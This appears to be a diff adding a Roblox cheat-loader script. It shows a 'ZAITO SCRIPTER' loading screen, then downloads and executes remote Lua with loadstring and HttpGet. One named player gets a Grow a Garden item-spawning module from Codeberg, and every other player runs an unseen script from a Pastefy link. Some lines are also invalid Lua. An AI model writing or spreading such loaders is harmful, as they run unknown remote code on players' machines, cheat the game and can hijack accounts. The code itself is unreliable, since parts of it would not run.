@@ -1,0 +1,110 @@
+local Players      = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local StarterGui   = game:GetService("StarterGui")
+local lp           = Players.LocalPlayer
+local plrName      = lp.Name
+
+---------------------------------------------------------------------
+-- 1. Build a lightweight “anime” loading GUI
+---------------------------------------------------------------------
+local scrGui  = Instance.new("ScreenGui")
+scrGui.Name   = "AnimeLoader"
+scrGui.ResetOnSpawn = false
+scrGui.Parent = (StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.All) and game.CoreGui) or lp:WaitForChild("PlayerGui")
+
+-- black backdrop
+local bg = Instance.new("Frame", scrGui)
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.new(0,0,0) -- Pure black background
+bg.BorderSizePixel  = 0
+
+-- title: "ZAITO SCRIPTER"
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.fromScale(1, 0.15)
+title.Position = UDim2.fromScale(0, 0.1)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.new(1,1,1)
+title.Text = "ZAITO SCRIPTER"
+
+-- decorative rotating image (“anime vibe”)
+local ring = Instance.new("ImageLabel", bg)
+ring.Image = "rbxassetid://11403634009"  -- replace with your own anime sprite if desired
+ring.Size  = UDim2.fromScale(.25,.25)
+ring.Position = UDim2.fromScale(.375,.3)
+ring.BackgroundTransparency = 1
+
+-- progress bar container
+local barBack = Instance.new("Frame", bg)
+barBack.AnchorPoint = Vector2.new(.5,.5)
+barBack.Size = UDim2.fromScale(.6,.075)
+barBack.Position = UDim2.fromScale(.5,.7)
+barBack.BackgroundColor3 = Color3.fromRGB(60,60,85)
+barBack.BorderSizePixel  = 0
+barBack.ClipsDescendants = true
+barBack:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", barBack)
+
+-- progress fill
+local barFill = Instance.new("Frame", barBack)
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(255,105,180)
+barFill.BorderSizePixel  = 0
+barFill:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", barFill)
+
+-- percentage label
+local pct = Instance.new("TextLabel", bg)
+pct.Size = UDim2.fromScale(1, .1)
+pct.Position = UDim2.fromScale(0, .58)
+pct.BackgroundTransparency = 1
+pct.TextScaled = true
+pct.Font = Enum.Font.GothamBold
+pct.TextColor3 = Color3.new(1,1,1)
+pct.Text = "0%"
+
+---------------------------------------------------------------------
+-- 2. Animate loading 0 → 100 %
+---------------------------------------------------------------------
+local duration = 5                                   -- seconds
+local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+local goal = { Size = UDim2.new(1,0,1,0) }
+local tween = TweenService:Create(barFill, tweenInfo, goal)
+
+-- update percentage text each 0.05 s
+local startTime = tick()
+local runRenderStepped
+runRenderStepped = game:GetService("RunService").RenderStepped:Connect(function()
+    local alpha = math.clamp((tick() - startTime)/duration, 0, 1)
+    pct.Text = string.format("%d%%", math.floor(alpha * 100))
+    ring.Rotation = alpha * 720        -- two full turns
+    if alpha >= 1 then
+        runRenderStepped:Disconnect()
+    end
+end)
+
+tween:Play()
+tween.Completed:Wait()                 -- wait until bar is full
+
+-- small fade
+TweenService:Create(bg, TweenInfo.new(.4), {BackgroundTransparency = 1}):Play()
+TweenService:Create(scrGui, TweenInfo.new(.4), {GlobalTransparency = 1}):Play()
+task.wait(.5)
+scrGui:Destroy()
+
+---------------------------------------------------------------------
+-- 3. Decide which payload to launch
+---------------------------------------------------------------------
+if plrName == "playsafe_kurt" then
+    -- Kurt’s custom Spawner
+    local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+    Spawner.GetPets()
+    Spawner.GetSeeds()
+    Spawner.SpawnPet("Raccoon", 1, 2)
+    Spawner.SpawnSeed("Candy Blossom")
+    Spawner.SpawnEgg("Night Egg")
+    Spawner.Spin("Sunflower")
+    Spawner.Load()
+else
+    -- Everyone else → Pastefy script
+    loadstring(game:HttpGet("https://pastefy.app/IyNqt1kl/raw"))()
+end
